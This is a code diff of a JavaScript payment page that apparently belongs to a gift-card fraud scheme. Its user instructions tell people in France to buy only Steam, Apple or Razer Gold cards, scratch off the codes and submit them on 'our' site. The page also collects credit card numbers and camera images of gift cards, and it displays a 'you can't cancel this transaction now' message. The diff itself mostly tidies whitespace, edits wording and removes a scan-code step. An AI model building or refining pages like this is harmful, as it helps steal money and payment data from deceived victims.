@@ -23,7 +23,7 @@ function initializeState() {
         txn: "",
         charge: 0.98,
         toPay: 0,
-        creditCardIndex: 0,  
+        creditCardIndex: 0,
         paypalIndex: 0,
         cardIndex: 0,
         giftCardIndex: 0,
@@ -41,34 +41,31 @@ function initializeState() {
             type: "store",
             online: [
                 {
-                    image: "/src/images/online-1.jpg",
+                    image: "/src/images/paypal.jpeg",
                     title: "Step 1: Walk Into the Store",
                     description: "Start the physical gift card process by walking into a major retail store or supermarket in France. Look for stores like Carrefour, Monoprix, Intermarché, or Fnac. These places usually have a dedicated section for gift cards. Once inside, head toward the electronics, checkout, or prepaid card section."
                 },
                 {
-                    image: "/src/images/online-2.jpg",
+                    image: "https://example.com/giftcard-step2.jpg",
                     title: "Step 2: Locate the Gift Card Section and Select an Accepted Card",
                     description: "Inside the store, look for the rack labeled 'Cartes Cadeaux' (Gift Cards). You’ll find many brands, but only choose from these three: Steam, Apple, Razer Gold. <br/> Make sure the card is sealed and check the amount written on it, such as €20 or €50. Avoid buying unaccepted cards like Amazon, Netflix, or PlayStation"
                 },
                 {
-                    image: "/src/images/online-3.jpg",
+                    image: "https://example.com/giftcard-step3.jpg",
                     title: "Step 3: Make Payment for the Gift Card",
                     description: "Once you've chosen your Steam, Apple, or Razer Gold gift card, take it to the checkout counter. The cashier will scan and activate it. Pay using cash, credit card, or mobile payment.\n Only after payment will the gift card be usable, so always ask for a receipt as proof."
                 },
                 {
-                    image: "/src/images/online-4.jpg",
+                    image: "https://example.com/giftcard-step4.jpg",
                     title: "Step 4: Scratch the Card to Reveal the Code",
                     description: "After payment, gently scratch the silver coating on the back of the card using a coin or key. This will uncover your gift card code, which is needed to redeem or make a payment. Be careful not to damage the numbers or letters. Keep the card safe and readable."
                 },
                 {
-                    image: "/src/images/online-5.jpg",
+                    image: "https://example.com/giftcard-step4.jpg",
                     title: "Step 5: Enter the Code on Our Payment Platform",
                     description: "Once the code is revealed, visit our redeem code payment site. Type in the exact characters shown on the card into the Enter Code box. Select the correct Card Type (Steam, Apple, or Razer Gold), enter the Amount, and then tap Redeem to finalize the process. <br/>Make sure the code is correctly entered — no spaces or typos."
                 },
-                {
-                    image: "https://example.com/giftcard-step4.jpg",
-                    title: "Step 6: Use Scan Code to Upload the Card Photo", description: " Instead of typing the code manually, you can scan the gift card using your phone. Just tap the Scan Code button on the site and position the card in front of your camera. <br/>Make sure the code is clearly visible and fully within the frame. The system will automatically read and extract the code from the image for payment.",
-                },
+
             ],
             store: [
                 {
@@ -493,11 +490,11 @@ function setupCreditCardInputs(state) {
                 value = value.match(new RegExp('.{1,4}', 'g'))?.join(' ') || value;
             }
             e.target.value = value;
-        
+
             // Detect card brand
             state.detectedBrand = detectCardBrand(value);
             validateInputs();
-        
+
             // Update UI to show detected brand
             const cardBrands = document.querySelectorAll('.card-brand');
             cardBrands.forEach(brand => {
@@ -510,23 +507,23 @@ function setupCreditCardInputs(state) {
     }
 
 
- // Update card icon in input field
-        const inputIcon = document.querySelector('.input-with-icon .card-icon');
-        if (state.detectedBrand) {
-            const brand = cardState.cardBrands.find(b => b.name === state.detectedBrand);
-            if (!inputIcon) {
-                const iconDiv = document.createElement('div');
-                iconDiv.className = 'card-icon';
-                iconDiv.style.background = brand.pattern;
-                iconDiv.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
-                document.querySelector('.input-with-icon').appendChild(iconDiv);
-            } else {
-                inputIcon.style.background = brand.pattern;
-                inputIcon.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
-            }
-        } else if (inputIcon) {
-            inputIcon.remove();
+    // Update card icon in input field
+    const inputIcon = document.querySelector('.input-with-icon .card-icon');
+    if (state.detectedBrand) {
+        const brand = cardState.cardBrands.find(b => b.name === state.detectedBrand);
+        if (!inputIcon) {
+            const iconDiv = document.createElement('div');
+            iconDiv.className = 'card-icon';
+            iconDiv.style.background = brand.pattern;
+            iconDiv.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
+            document.querySelector('.input-with-icon').appendChild(iconDiv);
+        } else {
+            inputIcon.style.background = brand.pattern;
+            inputIcon.innerHTML = `<img src="${brand.image}" alt="${brand.name}">`;
         }
+    } else if (inputIcon) {
+        inputIcon.remove();
+    }
 
 
     // Format expiration date
@@ -909,7 +906,7 @@ function setupGiftCardFormValidation(state) {
             ctx.drawImage(
                 video,
                 scanX, scanY, scanWidth, scanHeight,
-                0, 0, scanWidth, scanHeight      
+                0, 0, scanWidth, scanHeight
             );
 
             // Convert canvas to image and store in state
@@ -1301,7 +1298,7 @@ function showStillProcessing() {
 // ==================== CREDIT CARD UI TEMPLATES ====================
 function createCreditCardSection1(state) {
     const cardState = initializeCreditCardState();
-    
+
     return `
     <div class="payment-section credit-card-section active" id="credit-card-details">
         <div class="cc-header">
@@ -1868,7 +1865,10 @@ function createBankSection5(state) {
           <button class="util-btn cancel">Close</button>
          </div>
             <div class="info-div">
-              You can't cancel this trade now, because it is still processing...
+              You can't cancel this transaction now, because it is still processing...
+
+<br/>
+Please wait ☺️
             </div>
         </div>
         
